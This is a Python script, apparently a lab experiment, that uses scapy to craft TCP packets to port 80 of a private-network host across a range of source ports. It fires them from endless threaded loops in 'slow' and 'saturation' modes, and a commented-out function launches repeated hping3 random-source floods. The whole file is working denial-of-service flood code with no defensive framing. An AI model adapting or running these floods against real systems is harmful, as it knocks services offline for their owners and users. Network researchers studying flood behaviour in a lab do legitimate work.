from scapy.all import *
import time
from random import randint
import threading
from threading import Thread
from multiprocessing import Pool, Process
import os

'''The Internet Assigned Numbers Authority (IANA) suggests the range 49152 to 65535
(2e15+2e14 to 2e16-1) for dynamic or private ports. Many Linux kernels use the port
range 32768 to 61000. FreeBSD has used the IANA port range since release 4.6.'''

#targetIP = '192.168.1.150'
targetIP = '192.168.1.100'
my_ip = '192.168.1.250'


def send_while(pkt_list,i):
 #time.sleep(230)
 while True:
  now = time.time()
  send(pkt_list)
  elapsed = time.time() - now
  print "Has been sent in Slow Mode", i,"packets in:", elapsed,"seconds."
  time.sleep(randint(3,8))
#send(pkt_list, inter=0.25, loop=1)

def send_sat_while(pkt_sat_list):
 time.sleep(10)
 while True:
  #t_end = time.time() + 5 * 1
  #while time.time() < t_end:
  now = time.time()
  send(pkt_sat_list)
  elapsed = time.time() - now
  print "Has been sent in Saturation Mode", len(pkt_sat_list),"packets in:", elapsed, "seconds."
  #time.sleep(10)

def send_while_hping3():
 time.sleep(240)
 #command = "timeout 60s hping3 --rand-source 192.168.1.100 -V -i u5000"
 command = "hping3 --rand-source 192.168.1.100 -V -i u5000"
 #os.system(command)
 while True:
  os.system(command)
  #print "Enviei rajada!!!!!!!!!!!!!!!!!!!!!!!!!!!"
  #print "Has been sent in Saturation Mode", i2,"packets in:", elapsed,"seconds."
  time.sleep(120)
  #print "Acordei do SLEEP!!!!!!!!!!!"

def send_sat_whie2(pkt_list2,i2):
 time.sleep(240)
 while True:
  now = time.time()
  send(pkt_list2)
  elapsed = time.time() - now
  print "Has been sent a Saturation Blast!!!"
  #time.sleep(randint(0,3))
#send(pkt_list, inter=0.25, loop=1)

list_size = 25
pkt_list = []
i = 0
pkt_sat_list = []
#49912==760
#49952==800
#50912==1000
#49832==680
list_size2 = 300
pkt_list2 = []
i2 = 0

'''for port in range(49912,50812):
 fake_pkt = IP(src=my_ip,dst=targetIP) / TCP(sport=port,dport=80)
 #pkt_sat_list.append(fake_pkt)
 #Thread(target=send_sat_while, args=(pkt_sat_list,)).start()
 pkt_list2.append(fake_pkt)
 i2 = i2+1
 if i2 >=list_size2:
  Thread(target=send_sat_while2, args=(pkt_list2,i2,)).start()
  i2 = 0
  pkt_list2 = []
  #time.sleep(randint(3,10))'''

#Thread(target=send_while_hping3).start()

for port in range(50000,50250):
 spoofed_pkt = IP(src=my_ip,dst=targetIP) / TCP(sport=port,dport=80)
 pkt_list.append(spoofed_pkt)
 i = i+1
 if i >= list_size:
  #Process(target=send_pkts, args=(pkt_list,)).start()
  Thread(target=send_while, args=(pkt_list,i,)).start()
  i = 0
  pkt_list = []
  time.sleep(randint(3,8))
#Thread(target=send_sat_while, args=(pkt_sat_list,)).start()
